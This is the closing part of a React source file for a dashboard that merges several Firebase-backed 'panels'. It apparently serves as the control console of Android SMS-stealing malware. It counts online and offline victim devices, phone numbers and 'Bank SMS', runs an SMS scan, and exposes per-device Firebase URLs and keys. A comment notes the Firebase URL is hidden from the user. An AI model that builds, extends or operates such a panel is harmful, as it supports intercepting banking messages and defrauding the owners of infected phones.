          <span className="badge" style={{background:"rgba(34,211,238,.1)",borderColor:"rgba(34,211,238,.3)",color:"#a5f3fc"}}>MERGED</span>
        </div>
        <div style={{position:"relative",flex:1,minWidth:200,maxWidth:380}}>
          <span style={{position:"absolute",left:12,top:"50%",transform:"translateY(-50%)",color:"var(--muted-2)"}}>{Ic.search(15)}</span>
          <input value={search} onChange={e=>setSearch(e.target.value)} className="inp" placeholder="Search all panels…" style={{padding:"10px 14px 10px 36px"}}/>
        </div>
        <div style={{marginLeft:"auto",display:"flex",gap:8,alignItems:"center",flexWrap:"wrap"}}>
          <span className="badge" style={{background:"rgba(34,211,238,.08)",borderColor:"rgba(34,211,238,.3)",color:"#a5f3fc",padding:"6px 12px"}}>{accounts.length} panels</span>
          {!PERF.isLowEnd && <div style={{display:"flex",alignItems:"center",gap:6,padding:"7px 12px",borderRadius:999,background:"rgba(14,12,28,.6)",border:"1px solid var(--border)"}}>{Ic.clock(13)}<span className="mono" style={{fontSize:11,fontWeight:700,color:"var(--muted)"}}>{now.toLocaleTimeString("en-US",{hour:"2-digit",minute:"2-digit",hour12:false})}</span></div>}
          <TGButton label="Telegram"/>
          <button onClick={shareAll} disabled={!accounts.length} className="btn btn-cyan" style={{padding:"8px 14px",fontSize:11}}>{Ic.share(13)}Share</button>
          <button onClick={()=>{if(confirm("Logout?")) onLogout();}} className="btn btn-ghost" style={{padding:"8px 14px",fontSize:11}}>{Ic.chevL(13)}Back</button>
        </div>
      </div>
    </header>
    <div style={{borderBottom:"1px solid var(--border)",background:"rgba(4,4,10,.6)"}}>
      <div style={{maxWidth:1400,margin:"0 auto",padding:"14px 22px",display:"flex",alignItems:"center",gap:26,flexWrap:"wrap"}}>
        <div style={{display:"flex",gap:24,flexWrap:"wrap"}}>
          <StatTile label="Total" value={devices.length} delay={0}/>
          <StatTile label="Online" value={online} color="#34d399" delay={0.05}/>
          <StatTile label="Offline" value={offline} color="var(--muted)" delay={0.1}/>
          <StatTile label="Numbers" value={phoneNums} color="#a5f3fc" delay={0.15}/>
          <StatTile label="Panels" value={accounts.length} color="#c4b5fd" delay={0.2}/>
          <StatTile label="Bank SMS" value={bankSms} color="#34d399" delay={0.25}/>
        </div>
        <div style={{marginLeft:"auto",display:"flex",gap:8,alignItems:"center",flexWrap:"wrap"}}>
          {["all","online","offline"].map(f=><button key={f} onClick={()=>setFilter(f)} className={"chip"+(filter===f?" active":"")}>{f}</button>)}
          <button onClick={()=>load(true)} className="ibtn" style={{padding:9}}>{Ic.refresh(14)}</button>
        </div>
      </div>
    </div>
    <main style={{flex:1,maxWidth:1400,margin:"0 auto",width:"100%",padding:"22px"}}>
      {loading ? <div style={{display:"flex",alignItems:"center",gap:10,justifyContent:"center",padding:"70px 20px"}}><span className="spin"/><span style={{fontSize:13,color:"var(--muted)"}}>Loading all panels…</span></div>
      : devices.length===0 ? <div className="a-up" style={{textAlign:"center",padding:"70px 20px"}}><p style={{fontSize:15,fontWeight:700,color:"var(--muted)"}}>No devices across saved panels</p></div>
      : <>
          {scanning && <div className="a-in" style={{display:"flex",alignItems:"center",gap:10,marginBottom:14,padding:"8px 14px",borderRadius:12,background:"rgba(14,12,28,.6)",border:"1px solid var(--border)",width:"fit-content"}}><span className="spin sm"/><span style={{fontSize:11,color:"var(--muted)"}}>Scanning SMS…</span></div>}
          <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(290px,1fr))",gap:16}}>
            {filtered.map((d,i)=>(
              <div key={`${d.srcId}:${d.id}`} className="a-up" style={{animationDelay:`${Math.min(i*0.03,0.4)}s`}}>
                {/* ⚠️ Firebase URL Header Hata Diya Gaya Hai Taaki User Ko Na Dikhe */}
                <DeviceCard dev={d} delay={0} onClick={()=>setSelected({dev:d,account:{url:d.srcUrl,key:d.srcKey}})} pinned={pinnedIds.includes(d.id)} onTogglePin={togglePinDevice}/>
              </div>
            ))}
            {filtered.length===0&&<div style={{gridColumn:"1/-1",padding:"70px 20px",textAlign:"center",color:"var(--muted-2)",fontSize:12}}>No devices match filter</div>}
          </div>
        </>}
    </main>
    <Toast msg={msg}/>
    {selected && <DeviceDrawer dev={selected.dev} fbUrl={selected.account.url} fbKey={selected.account.key} onClose={()=>setSelected(null)} onDelete={()=>{setSelected(null);load(true);}} showToast={toast}/>}
  </div>;
}

/* ============ APP ============ */
function App(){
  const [welcomeDone,setWelcomeDone]=useState(()=>{try{return localStorage.getItem(WELCOME_KEY)==="1";}catch{return false;}});
  const [acc,setAcc]=useState(null);
  const [merged,setMerged]=useState(false);
  const connect=(url,key)=>{setMerged(false);setAcc({url,key});};
  const logout=()=>{setAcc(null);setMerged(false);};
  const mergeAll=()=>{setAcc(null);setMerged(true);};
  if(!welcomeDone) return <WelcomeGate onEnter={()=>setWelcomeDone(true)}/>;
  return <>
    {merged ? <MergedView onLogout={logout}/>
      : acc ? <Dashboard fbUrl={acc.url} fbKey={acc.key} onLogout={logout}/>
      : <LoginScreen onConnect={connect} onMergeAll={mergeAll}/>}
  </>;
}
ReactDOM.createRoot(document.getElementById("root")).render(<App/>);
/* ============ END OF FILE ============ */